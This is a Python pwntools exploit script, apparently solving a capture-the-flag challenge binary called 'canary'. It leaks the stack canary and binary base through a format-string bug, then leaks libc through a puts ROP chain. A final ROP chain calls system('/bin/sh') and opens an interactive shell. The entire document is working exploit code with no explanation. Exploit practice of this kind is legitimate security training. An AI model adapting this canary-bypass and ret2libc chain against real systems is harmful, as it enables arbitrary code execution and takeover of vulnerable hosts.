from pwn import *
from pwn import p64, u64

context.log_level = "Error"

pros = process("./canary")
elf = ELF("./canary")
rop = ROP("./canary")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# -------------------------------------------------------

# for i in range(10, 48):
#     pros = process("./canary")
#     pros.recvline()
#     payload = f"%{i}$p"
#     pros.sendline(payload)
#     print(pros.recvline(), i)
#     pros.sendline(b"ABC")
#     pros.close()

# canary = 39
# start = 47

# -------------------------------------------------------

pros.recvline()

payload = b"%39$p.%47$p"
pros.sendline(payload)

leaks = pros.recvline()
canary = int(leaks.split(b".")[0], 16)
start = int(leaks.split(b".")[1], 16)

bin_addr = start - elf.symbols["_start"]

# -------------------------------------------------------

payload = b"A" * 104
payload += p64(canary)
payload += b"A" * 8
payload += p64(bin_addr + rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(bin_addr + elf.got["puts"])
payload += p64(bin_addr + elf.symbols["puts"])
payload += p64(bin_addr + elf.symbols["main"])

pros.sendline(payload)
pros.recvline()
puts_addr = u64(pros.recvline().strip().ljust(8, b"\x00"))
libc_addr = puts_addr - libc_elf.symbols["puts"]

pros.sendline(b"ABC")

# -------------------------------------------------------

payload = b"A" * 104
payload += p64(canary)
payload += b"A" * 8
payload += p64(bin_addr + rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(libc_addr + next(libc_elf.search(b"/bin/sh")))
payload += p64(bin_addr + rop.find_gadget(["ret"]).address)
payload += p64(libc_addr + libc_elf.symbols["system"])
payload += p64(libc_addr + libc_elf.symbols["exit"])

pros.sendline(payload)
pros.recvlines(3)
pros.interactive()
